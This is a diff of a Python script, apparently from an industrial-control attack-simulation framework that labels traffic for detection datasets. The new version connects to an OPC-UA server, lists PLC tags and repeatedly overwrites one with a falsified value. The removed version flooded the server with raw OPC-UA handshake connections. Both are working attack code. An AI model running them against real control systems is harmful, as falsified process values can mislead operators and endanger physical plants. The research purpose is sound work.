@@ -1,99 +1,88 @@
 """
 HMI_FAKE_DISPLAY
-Kỹ thuật: Giả lập HMI kết nối OPC-UA bất thường (raw socket).
-          Burst connect/HEL — server phải xử lý mỗi kết nối.
-Observable: OPC-UA TCP burst từ IP lạ (không phải HMI hợp lệ).
+Kỹ thuật: Ghi đè OPC-UA tag từ IP attacker (asyncua).
+Yêu cầu: opcua_sim_server đang chạy.
 
 Gọi từ bash:
   python -m attacks_ext.hmi_fake_display \
-      --duration 300 --opc-url opc.tcp://192.168.210.31:4840 \
+      --duration 300 --opc-url opc.tcp://127.0.0.1:4840 \
       --session-id bt_s1 --host-id attacker_host \
       --label-file labels/day7_timeline.csv
 """
 
-import socket
-import struct
+import asyncio
 import time
 from attacks_ext.config_ext import base_parser, write_label
 
-INTERVAL = 0.2
 
-
-def build_hello(host, port):
-    endpoint = f"opc.tcp://{host}:{port}".encode()
-    ep_len = len(endpoint)
-    msg_size = 28 + ep_len
-    return (
-        b'HEL' + b'F' +
-        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
-        struct.pack('<I', ep_len) + endpoint
-    )
-
-
-def fake_hmi_connect(host, port, hello_msg):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        s.connect((host, port))
-        s.send(hello_msg)
-        try:
-            s.recv(1024)
-        except Exception:
-            pass
-        s.close()
-        return True
-    except Exception:
-        return False
-
-
-def run(args):
+async def _run(args):
     label_prefix = "HMI_FAKE_DISPLAY"
-
-    # Parse host:port from opc_url
-    url = args.opc_url.replace("opc.tcp://", "")
-    parts = url.split(":")
-    host = parts[0]
-    port = int(parts[1]) if len(parts) > 1 else 4840
-
     write_label(args.label_file, label_prefix, "START",
                 args.session_id, args.host_id,
                 episode_id=args.episode_id, day=args.day,
-                note=f"dur={args.duration}s target={host}:{port}")
+                note=f"dur={args.duration}s opc={args.opc_url}")
 
-    success_count = 0
-    total = 0
-    hello = build_hello(host, port)
-    end_time = time.time() + args.duration
+    iteration = 0
 
     try:
-        print(f"[*] HMI_FAKE_DISPLAY -> {host}:{port}")
-        print(f"[*] Burst OPC-UA HEL connects, interval {INTERVAL}s")
+        from asyncua import Client
 
-        while time.time() < end_time:
-            result = fake_hmi_connect(host, port, hello)
-            total += 1
-            if result:
-                success_count += 1
-            if total % 20 == 0:
-                print(f"  [{total}] sent={success_count} rate={success_count//(time.time()-end_time+args.duration+1):.0f}/s")
-            time.sleep(INTERVAL)
+        async with Client(url=args.opc_url) as client:
+            ns_idx = await client.get_namespace_index("PLC")
+            print(f"[+] OPC-UA connected, namespace PLC = {ns_idx}")
 
-        print(f"[*] Done: {success_count}/{total} connects")
+            # Find writable tags
+            plc = await client.nodes.objects.get_child(f"{ns_idx}:PLC")
+            tags = {}
+            for child in await plc.get_children():
+                name = (await child.read_browse_name()).Name
+                if "Alarm" not in name:
+                    try:
+                        val = await child.read_value()
+                        tags[name] = (child, val)
+                        print(f"  [TAG] {name} = {val}")
+                    except Exception:
+                        pass
 
+            if not tags:
+                print("[!] No writable tags found")
+                return
+
+            first_tag = list(tags.keys())[0]
+            node, orig_val = tags[first_tag]
+            fake_val = (not orig_val) if isinstance(orig_val, bool) else round(orig_val * 1.5, 2)
+
+            print(f"\n[*] Fake display: {first_tag}: {orig_val} -> {fake_val}")
+
+            end_time = time.time() + args.duration - 5
+            while time.time() < end_time:
+                await node.write_value(fake_val)
+                iteration += 1
+                await asyncio.sleep(2)
+
+            await node.write_value(orig_val)
+            print(f"[*] Restored {first_tag} = {orig_val}")
+
+    except ImportError:
+        print("[ERR] asyncua not installed: pip install asyncua cryptography")
+    except ConnectionRefusedError:
+        print(f"[ERR] OPC-UA server not running at {args.opc_url}")
     except Exception as e:
         print(f"[ERR] {e}")
     finally:
         write_label(args.label_file, label_prefix, "END",
                     args.session_id, args.host_id,
                     episode_id=args.episode_id, day=args.day,
-                    note=f"connects={success_count}/{total}")
+                    note=f"iterations={iteration}")
+
+
+def run(args):
+    asyncio.run(_run(args))
 
 
 def main():
-    p = base_parser("HMI Fake Display Attack (Raw OPC-UA)")
-    p.add_argument("--opc-url", default="opc.tcp://192.168.210.31:4840")
-    p.add_argument("--opc-username", default="")
-    p.add_argument("--opc-password", default="")
+    p = base_parser("HMI Fake Display Attack (OPC-UA)")
+    p.add_argument("--opc-url", default="opc.tcp://127.0.0.1:4840")
     args = p.parse_args()
     run(args)
 
